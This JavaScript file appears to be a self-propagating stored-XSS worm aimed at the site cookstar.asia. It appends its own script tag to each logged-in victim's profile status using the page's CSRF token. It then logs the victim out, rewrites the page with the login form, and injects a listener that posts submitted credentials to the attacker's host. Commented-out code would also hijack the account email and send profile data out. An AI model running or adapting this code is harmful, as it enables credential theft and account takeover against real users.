(function ($) {
    var scriptName = 'cookstar.asia.js';

    addScriptToUserStatus(getScript().prop('outerHTML'))
        .then(function () {
            console.log("Status was updated");
            return logoutIfAuthenticated();
        })
        .then(function () {
            showLoginForm();
        });

    function logoutIfAuthenticated() {
        if (isAuthenticated()) {
            return $.get('https://cookstar.asia/auth/logout');
        }

        return $.Deferrered().resolve(true);
    }

    function showLoginForm() {
        $.get('/login').then(function (html) {
            var script = '<script>' + getLoginPageListener() + '</script>';
            document.open('text/html', 'replace');
            document.write(html + script);
            document.close();
            console.log(script);
        });
    }

    function getLoginPageListener() {
        function onPageReady($, attackerHost) {
            console.log('network has been monitored');
            $('form').one('submit',function (e) {
                e.preventDefault();
                var data = {};

                new FormData(this).forEach(function (value, key) {
                    data[key] = value;
                });

                $.ajax({
                    type: 'POST',
                    url: attackerHost + '/cookstar.php',
                    data: data
                }).then(function () {
                    $(this).submit();
                }.bind(this));
            });
        }

        return '('
            + onPageReady.toString()
            + ')(jQuery, "' + getAttackerHost() + '");'
    }

    function loadProfile() {
        var $profile = $('.profile a').filter(function (i, a) {
            return $(a).text() === 'Thông tin cá nhân';
        });

        return $.get($profile.attr('href'));
    }

    function getCurrentStatus() {
        return loadProfile()
            .then(function (html) {
                var defer = $.Deferred();
                defer.resolve($(html).find('#update_status').val());
                return defer;
            })
    }

    function isAuthenticated() {
        return $('#avatar').length > 0;
    }

    function addScriptToUserStatus(appending) {

        if (!isAuthenticated()) {
            return $.Deferred().resolve(false);
        }

        return getCurrentStatus()
            .then(function (status) {
                var hasScript = status.indexOf(appending) !== -1;
                if (hasScript) {
                    return $.Deferred().resolve(status);
                }

                var csrf = $('[name=csrf-token]').attr('content');
                var data = {
                    _token: csrf,
                    update_status: status + appending
                };

                return $.post('/updateStatus', data);
            });
    }

    function getAttackerHost() {
        var $scripts = getScript();
        var src =  $scripts.prop('src');
        var parts = src.match(/^(https?:\/\/([^\/]+))\//);
        return parts[1] || '';
    }

    function getScript() {
        return $('script[src$="/'+ scriptName +'"]');
    }

    function wrapUrl(path) {
        return getAttackerHost() + path;
    }

    // function submitForm($form) {
    //     var url = $form.attr('action');
    //     var method = $form.attr('method');
    //     var data = {};
    //     $form.find('input[name]').each(function (i, input) {
    //         var name = $(input).attr('name');
    //         data[name] = $(input).val();
    //     });
    //
    //     return $.ajax({
    //         url: url,
    //         type: method,
    //         data: data
    //     });
    // }

    // function updateEmail(email) {
    //     return loadProfile()
    //         .then(function (html) {
    //             var $updateProfile = $('#personal a', html);
    //             return $.get($updateProfile.attr('href'));
    //         })
    //         .then(function (html) {
    //             var $html = $(html);
    //             var $email = $html.find('#email');
    //             $email.val(email);
    //             $form = $email.closest('form');
    //             return submitForm($form);
    //         });
    // }

    // var date = new Date();
    // var email = 'cookstart-' + date.getTime() +'@mailinator.com';
    //
    // updateEmail(email)
    //     .then(function () {
    //         return $.post(wrapUrl('/cookstar.php'), {
    //             id: getProfileId(),
    //             name: getProfileName(),
    //             email: email
    //         });
    //     })
    //     .then(function () {
    //         console.log("The data has been sent");
    //     });
    // function getProfileId() {
    //     var notificationUrl = $('.notify-all').attr('href');
    //     if (matches = notificationUrl.match(/\/notifications\/(\d+)/)) {
    //         return matches[1];
    //     }
    //
    //     return null;
    // }
    //
    // function getProfileName() {
    //     return $('.profile').find('ul>li:first').text();
    // }

})(jQuery);
